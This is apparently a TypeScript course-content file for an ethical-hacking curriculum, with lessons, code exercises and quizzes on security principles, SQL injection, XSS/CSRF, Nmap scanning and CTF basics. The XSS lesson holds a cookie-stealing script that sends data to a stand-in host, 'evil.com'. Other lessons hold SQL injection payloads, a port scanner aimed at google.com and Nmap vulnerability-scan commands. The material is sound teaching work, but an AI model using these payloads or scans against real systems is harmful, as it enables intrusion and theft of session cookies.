import type { CategoryDef } from '../types';
import { mcq, trueFalse, quiz, lesson, setupLesson } from '../helpers';

export const ethicalHackingCategory: CategoryDef = {
  name: 'Ethical Hacking',
  slug: 'ethical-hacking',
  description: 'Learn cybersecurity and ethical hacking — from foundations to penetration testing, web security, and CTF challenges.',
  icon: '🛡️',
  color: '#ef4444',
  sortOrder: 5,
  courses: [
    {
      title: 'Cybersecurity Foundations',
      slug: 'cybersecurity-foundations',
      description: 'Understand the CIA triad, common threats, encryption basics, and security principles every developer should know.',
      difficulty: 'beginner',
      language: 'en',
      estimatedHours: 15,
      resources: [
        { resourceType: 'youtube', title: 'Cybersecurity Full Course', url: 'https://www.youtube.com/watch?v=U_P23SqJaDc', author: 'freeCodeCamp', platform: 'YouTube' },
        { resourceType: 'article', title: 'OWASP Foundation', url: 'https://owasp.org/', author: 'OWASP' },
      ],
      modules: [
        {
          title: 'Security Principles',
          lessons: [
            lesson('The CIA Triad', 'cia-triad', `# The CIA Triad

The three pillars of information security:

## Confidentiality
Ensuring data is accessible only to authorized individuals.

**Techniques:**
- Encryption (AES, RSA)
- Access control lists (ACL)
- Authentication & authorization
- Data classification

## Integrity
Ensuring data has not been altered by unauthorized parties.

**Techniques:**
- Hash functions (SHA-256)
- Digital signatures
- Checksums
- Version control

## Availability
Ensuring systems and data are available when needed.

**Techniques:**
- Redundancy & load balancing
- DDoS protection
- Regular backups
- Disaster recovery plans

## Common Threats

| Threat | Targets |
|--------|---------|
| Phishing | Confidentiality |
| Ransomware | Availability |
| Man-in-the-Middle | Confidentiality + Integrity |
| DDoS Attack | Availability |
| SQL Injection | Confidentiality + Integrity |

## Defense in Depth
Layer multiple security controls:
1. Physical security
2. Network security (firewalls)
3. Application security (input validation)
4. Data security (encryption)
5. User training`, {
              starterCode: `# Hashing demo (Python)\nimport hashlib\n\n# Hash a password\npassword = "MySecurePassword123"\nhash_obj = hashlib.sha256(password.encode())\nhash_hex = hash_obj.hexdigest()\n\nprint(f"Password: {password}")\nprint(f"SHA-256:  {hash_hex}")\nprint(f"Length:   {len(hash_hex)} characters")\n\n# Verify: same input = same hash\nhash2 = hashlib.sha256(password.encode()).hexdigest()\nprint(f"\\nMatch: {hash_hex == hash2}")  # True\n\n# Different input = different hash\nhash3 = hashlib.sha256("WrongPassword".encode()).hexdigest()\nprint(f"Wrong:  {hash3[:20]}...")\nprint(f"Match: {hash_hex == hash3}")  # False`,
              solutionCode: `import hashlib\n\npassword = "MySecurePassword123"\nhash_obj = hashlib.sha256(password.encode())\nhash_hex = hash_obj.hexdigest()\n\nprint(f"Password: {password}")\nprint(f"SHA-256:  {hash_hex}")\nprint(f"Length:   {len(hash_hex)} characters")\n\nhash2 = hashlib.sha256(password.encode()).hexdigest()\nprint(f"\\nMatch: {hash_hex == hash2}")\n\nhash3 = hashlib.sha256("WrongPassword".encode()).hexdigest()\nprint(f"Wrong:  {hash3[:20]}...")\nprint(f"Match: {hash_hex == hash3}")`,
              codeLanguage: 'python',
              estimatedMinutes: 20,
              xpReward: 50,
              quiz: quiz('CIA Triad Quiz', [
                mcq('What does the "C" in CIA stand for?', 'Confidentiality', ['Complexity', 'Compliance'], 'Confidentiality ensures data is only accessible to authorized users.'),
                mcq('Which attack primarily targets Availability?', 'DDoS', ['Phishing', 'SQL Injection'], 'DDoS floods servers to make them unavailable.'),
                trueFalse('SHA-256 is a reversible encryption algorithm.', false, 'SHA-256 is a one-way hash function — it cannot be reversed.'),
              ]),
            }),
            lesson('Network Security Basics', 'network-security-basics', `# Network Security Basics

## The TCP/IP Model

\`\`\`
Application Layer    (HTTP, DNS, SMTP)
Transport Layer      (TCP, UDP)
Internet Layer       (IP, ICMP)
Network Access Layer (Ethernet, Wi-Fi)
\`\`\`

## Common Ports

| Port | Service | Protocol |
|------|---------|----------|
| 21 | FTP | TCP |
| 22 | SSH | TCP |
| 80 | HTTP | TCP |
| 443 | HTTPS | TCP |
| 3306 | MySQL | TCP |
| 5432 | PostgreSQL | TCP |

## Firewalls
- **Packet Filter**: Examines packet headers (IP, port)
- **Stateful**: Tracks connection state
- **Application**: Inspects payload content (WAF)

## VPN & Encryption
- VPN creates an encrypted tunnel between client and server
- TLS/SSL encrypts HTTP traffic (HTTPS)
- SSH encrypts terminal connections

## Basic Network Commands

\`\`\`bash
ping google.com          # Test connectivity
traceroute google.com    # Trace the route
nslookup example.com     # DNS lookup
netstat -tuln            # Open ports
curl -I https://example.com  # HTTP headers
\`\`\`

## Security Best Practices
- Keep all software updated
- Use strong, unique passwords + 2FA
- Encrypt sensitive data in transit and at rest
- Follow the principle of least privilege
- Monitor logs for suspicious activity`, {
              starterCode: `# Network reconnaissance (Python)\nimport socket\n\n# DNS lookup\nhostname = "google.com"\nip = socket.gethostbyname(hostname)\nprint(f"{hostname} resolves to {ip}")\n\n# Port scanner (educational — only scan your own systems!)\ndef scan_port(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\ncommon_ports = [22, 80, 443, 3000, 8080]\nprint(f"\\nScanning {hostname}...")\nfor port in common_ports:\n    status = "OPEN" if scan_port(ip, port) else "closed"\n    print(f"  Port {port}: {status}")`,
              solutionCode: `import socket\n\nhostname = "google.com"\nip = socket.gethostbyname(hostname)\nprint(f"{hostname} resolves to {ip}")\n\ndef scan_port(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\ncommon_ports = [22, 80, 443, 3000, 8080]\nprint(f"\\nScanning {hostname}...")\nfor port in common_ports:\n    status = "OPEN" if scan_port(ip, port) else "closed"\n    print(f"  Port {port}: {status}")`,
              codeLanguage: 'python',
              estimatedMinutes: 25,
              xpReward: 60,
              quiz: quiz('Network Security Quiz', [
                mcq('Which port does HTTPS use?', '443', ['80', '22'], 'HTTPS uses port 443; HTTP uses port 80.'),
                trueFalse('A firewall can only block incoming traffic.', false, 'Firewalls can filter both inbound and outbound traffic.'),
                mcq('What does a VPN do?', 'Creates an encrypted tunnel for network traffic', ['Speeds up your internet', 'Removes viruses'], 'VPNs encrypt your network traffic through a secure tunnel.'),
              ]),
            }),
          ],
        },
      ],
    },

    {
      title: 'Web Application Security',
      slug: 'web-application-security',
      description: 'Master the OWASP Top 10 — XSS, SQL injection, CSRF, authentication flaws, and how to defend against them.',
      difficulty: 'intermediate',
      language: 'en',
      estimatedHours: 20,
      resources: [
        { resourceType: 'article', title: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/', author: 'OWASP' },
        { resourceType: 'youtube', title: 'Web Security Explained', url: 'https://www.youtube.com/watch?v=WlmKwIe9z1Q', author: 'Computerphile', platform: 'YouTube' },
      ],
      modules: [
        {
          title: 'OWASP Top 10',
          lessons: [
            lesson('SQL Injection', 'sql-injection', `# SQL Injection

## What is SQL Injection?
An attacker inserts malicious SQL code through user inputs to manipulate your database.

## Vulnerable Code

\`\`\`python
# NEVER DO THIS!
query = f"SELECT * FROM users WHERE name = '{user_input}'"
\`\`\`

If \`user_input\` is \`' OR '1'='1\`, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE name = '' OR '1'='1'
\`\`\`
This returns ALL users!

## Parameterized Queries (Safe)

\`\`\`python
# Python with psycopg2
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# Node.js with pg
pool.query("SELECT * FROM users WHERE name = $1", [userInput]);

# Java with PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, userInput);
\`\`\`

## Types of SQL Injection
- **Union-based**: Uses UNION to extract data from other tables
- **Blind**: No visible output — uses True/False conditions
- **Time-based**: Uses SLEEP() to infer data

## Prevention
1. **Always use parameterized queries** / prepared statements
2. Use an ORM (Prisma, SQLAlchemy, Hibernate)
3. Validate and sanitize all input
4. Apply the principle of least privilege to database users
5. Use Web Application Firewalls (WAF)`, {
              starterCode: `# SQL Injection demo (educational)\n\n# VULNERABLE (never do this!)\ndef vulnerable_login(username, password):\n    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"\n    print(f"Query: {query}")\n    return query\n\n# SAFE (parameterized)\ndef safe_login(username, password):\n    query = "SELECT * FROM users WHERE username=? AND password=?"\n    params = (username, password)\n    print(f"Query: {query}")\n    print(f"Params: {params}")\n    return query, params\n\n# Normal login\nprint("=== Normal Login ===")\nvulnerable_login("alice", "secret123")\n\n# SQL Injection attack\nprint("\\n=== SQL Injection Attack ===")\nvulnerable_login("' OR '1'='1' --", "anything")\n\n# Safe version blocks the attack\nprint("\\n=== Safe Login ===")\nsafe_login("' OR '1'='1' --", "anything")`,
              solutionCode: `def vulnerable_login(username, password):\n    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"\n    print(f"Query: {query}")\n    return query\n\ndef safe_login(username, password):\n    query = "SELECT * FROM users WHERE username=? AND password=?"\n    params = (username, password)\n    print(f"Query: {query}")\n    print(f"Params: {params}")\n    return query, params\n\nprint("=== Normal Login ===")\nvulnerable_login("alice", "secret123")\n\nprint("\\n=== SQL Injection Attack ===")\nvulnerable_login("' OR '1'='1' --", "anything")\n\nprint("\\n=== Safe Login ===")\nsafe_login("' OR '1'='1' --", "anything")`,
              codeLanguage: 'python',
              estimatedMinutes: 25,
              xpReward: 60,
              quiz: quiz('SQL Injection Quiz', [
                mcq('What is the primary defense against SQL injection?', 'Parameterized queries / prepared statements', ['Input length limits', 'HTTPS encryption'], 'Parameterized queries separate SQL code from data.'),
                trueFalse('Using an ORM eliminates all SQL injection risks.', false, 'ORMs help, but raw queries within ORMs can still be vulnerable if not parameterized.'),
                mcq('What does `\' OR \'1\'=\'1` do in a vulnerable query?', 'Makes the WHERE clause always true', ['Deletes all data', 'Creates a new user'], 'It turns the condition into an always-true expression, bypassing authentication.'),
              ]),
            }),
            lesson('XSS & CSRF', 'xss-csrf', `# XSS & CSRF

## Cross-Site Scripting (XSS)
Attacker injects malicious scripts into web pages viewed by other users.

### Types of XSS
- **Stored XSS**: Script saved in database (comments, profiles)
- **Reflected XSS**: Script in URL parameters
- **DOM-based XSS**: Script manipulates client-side DOM

### Example Attack

\`\`\`html
<!-- User submits this as a comment -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

### Prevention

\`\`\`javascript
// Escape HTML entities
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Use Content Security Policy headers
// Content-Security-Policy: default-src 'self'

// React auto-escapes by default!
// <div>{userInput}</div>  ← safe
// <div dangerouslySetInnerHTML={{__html: userInput}} /> ← DANGEROUS
\`\`\`

## Cross-Site Request Forgery (CSRF)
Tricks authenticated users into making unwanted requests.

### Prevention
- Use CSRF tokens in forms
- Check the \`Origin\` / \`Referer\` headers
- Use \`SameSite\` cookie attribute
- Require re-authentication for sensitive actions

\`\`\`html
<!-- CSRF token in form -->
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="random-token-here">
  <input name="amount" value="100">
  <button type="submit">Transfer</button>
</form>
\`\`\``, {
              starterCode: `# XSS prevention demo\n\ndef escape_html(text):\n    """Escape HTML special characters to prevent XSS\"\"\"\n    return (text\n        .replace("&", "&amp;")\n        .replace("<", "&lt;")\n        .replace(">", "&gt;")\n        .replace('"', "&quot;")\n        .replace("'", "&#039;"))\n\n# Malicious input\nmalicious = '<script>alert("XSS!")</script>'\n\nprint("=== Without Escaping (DANGEROUS) ===")\nprint(f"Output: {malicious}")\n\nprint("\\n=== With Escaping (SAFE) ===")\nsafe = escape_html(malicious)\nprint(f"Output: {safe}")\n\n# The browser would render the safe version as plain text\nprint("\\n=== The browser sees: ===")\nprint(safe)`,
              solutionCode: `def escape_html(text):\n    return (text\n        .replace("&", "&amp;")\n        .replace("<", "&lt;")\n        .replace(">", "&gt;")\n        .replace('"', "&quot;")\n        .replace("'", "&#039;"))\n\nmalicious = '<script>alert("XSS!")</script>'\nprint("=== Without Escaping (DANGEROUS) ===")\nprint(f"Output: {malicious}")\nprint("\\n=== With Escaping (SAFE) ===")\nsafe = escape_html(malicious)\nprint(f"Output: {safe}")`,
              codeLanguage: 'python',
              estimatedMinutes: 25,
              xpReward: 60,
              quiz: quiz('XSS & CSRF Quiz', [
                mcq('What is the main defense against XSS?', 'Escaping/sanitizing user output', ['Using HTTPS', 'Strong passwords'], 'Always escape user-generated content before rendering in HTML.'),
                mcq('What does a CSRF token prevent?', 'Forged requests from other sites', ['SQL injection', 'Brute force attacks'], 'CSRF tokens verify that the request came from your own site.'),
                trueFalse('React automatically escapes JSX expressions to prevent XSS.', true, 'React escapes values in JSX by default, unless you use `dangerouslySetInnerHTML`.'),
              ]),
            }),
          ],
        },
      ],
    },

    {
      title: 'Network Penetration Testing',
      slug: 'network-penetration-testing',
      description: 'Learn to think like a hacker — network scanning with Nmap, traffic analysis with Wireshark, and exploit methodologies.',
      difficulty: 'intermediate',
      language: 'en',
      estimatedHours: 25,
      resources: [
        { resourceType: 'youtube', title: 'Ethical Hacking Full Course', url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE', author: 'freeCodeCamp', platform: 'YouTube' },
        { resourceType: 'article', title: 'Nmap Reference Guide', url: 'https://nmap.org/book/man.html', author: 'Nmap.org' },
      ],
      modules: [
        {
          title: 'Reconnaissance & Scanning',
          lessons: [
            lesson('Network Scanning with Nmap', 'nmap-scanning', `# Network Scanning with Nmap

## What is Nmap?
A network scanning tool for discovering hosts and services.

> ⚠️ **Only scan networks you own or have permission to scan!**

## Basic Scans

\`\`\`bash
# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# Port scan (default 1000 ports)
nmap 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (versions, OS, scripts, traceroute)
nmap -A 192.168.1.1
\`\`\`

## Scan Types

| Flag | Scan Type | Description |
|------|-----------|-------------|
| \`-sT\` | TCP Connect | Full TCP handshake |
| \`-sS\` | SYN Stealth | Half-open (stealthier) |
| \`-sU\` | UDP | Scan UDP ports |
| \`-sV\` | Version | Detect service versions |
| \`-sC\` | Script | Run default NSE scripts |

## Nmap Scripting Engine (NSE)

\`\`\`bash
# Run vulnerability scripts
nmap --script=vuln 192.168.1.1

# HTTP enumeration
nmap --script=http-enum 192.168.1.1

# List available scripts
ls /usr/share/nmap/scripts/
\`\`\`

## Penetration Testing Methodology
1. **Reconnaissance**: Gather information
2. **Scanning**: Discover hosts, ports, services
3. **Exploitation**: Attempt to gain access
4. **Post-Exploitation**: Maintain access, pivot
5. **Reporting**: Document findings`, {
              starterCode: `# Nmap scanning demo (educational)\n# These commands should ONLY be used on systems you own\n\n# Host discovery\nnmap -sn 192.168.1.0/24\n\n# Service detection on a target\nnmap -sV -p 22,80,443,3306 target.local\n\n# Aggressive scan\nnmap -A target.local\n\n# Output results to file\nnmap -sV -oN scan_results.txt target.local`,
              solutionCode: `# Only scan systems you own or have permission to scan!\nnmap -sn 192.168.1.0/24\nnmap -sV -p 22,80,443,3306 target.local\nnmap -A target.local\nnmap -sV -oN scan_results.txt target.local`,
              codeLanguage: 'bash',
              estimatedMinutes: 25,
              xpReward: 60,
              quiz: quiz('Nmap Scanning Quiz', [
                mcq('What does `nmap -sV` detect?', 'Service versions running on open ports', ['Operating system', 'Vulnerabilities'], '`-sV` probes open ports to determine service and version info.'),
                trueFalse('You should always get permission before scanning a network.', true, 'Unauthorized scanning is illegal and unethical.'),
                mcq('What scan type is the stealthiest?', 'SYN scan (-sS)', ['TCP Connect (-sT)', 'UDP scan (-sU)'], 'SYN scans don\'t complete the TCP handshake, making them harder to detect.'),
              ]),
            }),
          ],
        },
      ],
    },

    {
      title: 'CTF Challenge Lab',
      slug: 'ctf-challenge-lab',
      description: 'Practice your skills with Capture The Flag challenges — reverse engineering, forensics, cryptography, and web exploitation.',
      difficulty: 'advanced',
      language: 'en',
      estimatedHours: 20,
      resources: [
        { resourceType: 'article', title: 'picoCTF', url: 'https://picoctf.org/', author: 'Carnegie Mellon' },
        { resourceType: 'article', title: 'Hack The Box', url: 'https://www.hackthebox.com/', author: 'Hack The Box' },
        { resourceType: 'youtube', title: 'CTF for Beginners', url: 'https://www.youtube.com/watch?v=Lus7aNf2xDg', author: 'John Hammond', platform: 'YouTube' },
      ],
      modules: [
        {
          title: 'CTF Fundamentals',
          lessons: [
            lesson('Intro to CTFs', 'intro-to-ctfs', `# Intro to CTFs

## What is a CTF?
Capture The Flag (CTF) competitions test cybersecurity skills through challenges. Find the hidden "flag" (usually a specific string).

## CTF Categories

### 🔍 Forensics
Analyze files, images, network captures to find hidden data.

\`\`\`bash
# Check file type
file mystery.jpg

# Extract hidden data
strings mystery.jpg | grep "flag"
binwalk mystery.jpg

# Analyze metadata
exiftool image.png
\`\`\`

### 🔐 Cryptography
Break or analyze encryption and encoding.

\`\`\`python
import base64

# Base64 decode
encoded = "ZmxhZ3toZWxsb19jdGZ9"
decoded = base64.b64decode(encoded).decode()
print(decoded)  # flag{hello_ctf}

# Caesar cipher brute force
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

cipher = "gtyf{mjqqt_btwqi}"
for i in range(26):
    print(f"Shift {i:2d}: {caesar_decrypt(cipher, i)}")
\`\`\`

### 🌐 Web Exploitation
Find vulnerabilities in web applications.

### ⚙️ Reverse Engineering
Analyze compiled programs to understand their behavior.

### 📡 Networking
Analyze packet captures and network protocols.

## CTF Platforms
- [picoCTF](https://picoctf.org/) — Beginner-friendly
- [Hack The Box](https://www.hackthebox.com/) — Advanced
- [TryHackMe](https://tryhackme.com/) — Guided paths
- [OverTheWire](https://overthewire.org/) — Linux + Security`, {
              starterCode: `# CTF Crypto Challenge\nimport base64\n\n# Challenge 1: Base64 decode\nencoded = "Q29kZU1lbnRvcntjcnlwdDBfbWFzdGVyfQ=="\ndecoded = base64.b64decode(encoded).decode()\nprint(f"Flag 1: {decoded}")\n\n# Challenge 2: Caesar cipher brute force\ndef caesar_decrypt(text, shift):\n    result = ""\n    for char in text:\n        if char.isalpha():\n            base = ord('A') if char.isupper() else ord('a')\n            result += chr((ord(char) - base - shift) % 26 + base)\n        else:\n            result += char\n    return result\n\ncipher = "Gsho{kwhgs_mwbhsf}"\nprint("\\nCaesar brute force:")\nfor i in range(26):\n    decrypted = caesar_decrypt(cipher, i)\n    if "flag" in decrypted.lower() or "code" in decrypted.lower():\n        print(f"  *** Shift {i}: {decrypted} ***")`,
              solutionCode: `import base64\n\nencoded = "Q29kZU1lbnRvcntjcnlwdDBfbWFzdGVyfQ=="\ndecoded = base64.b64decode(encoded).decode()\nprint(f"Flag 1: {decoded}")\n\ndef caesar_decrypt(text, shift):\n    result = ""\n    for char in text:\n        if char.isalpha():\n            base = ord('A') if char.isupper() else ord('a')\n            result += chr((ord(char) - base - shift) % 26 + base)\n        else:\n            result += char\n    return result\n\ncipher = "Gsho{kwhgs_mwbhsf}"\nfor i in range(26):\n    decrypted = caesar_decrypt(cipher, i)\n    if "flag" in decrypted.lower() or "code" in decrypted.lower():\n        print(f"Shift {i}: {decrypted}")`,
              codeLanguage: 'python',
              estimatedMinutes: 30,
              xpReward: 80,
              quiz: quiz('CTF Quiz', [
                mcq('What does CTF stand for?', 'Capture The Flag', ['Cybersecurity Test Framework', 'Code Test Facility'], 'CTF is a security competition where you find hidden "flags."'),
                mcq('What tool decodes Base64?', 'base64 module / command', ['nmap', 'wireshark'], 'Base64 is a common encoding used in CTF crypto challenges.'),
                trueFalse('CTFs are only for professional hackers.', false, 'CTFs are for all skill levels — platforms like picoCTF are designed for beginners!'),
              ]),
            }),
          ],
        },
      ],
    },
  ],
};
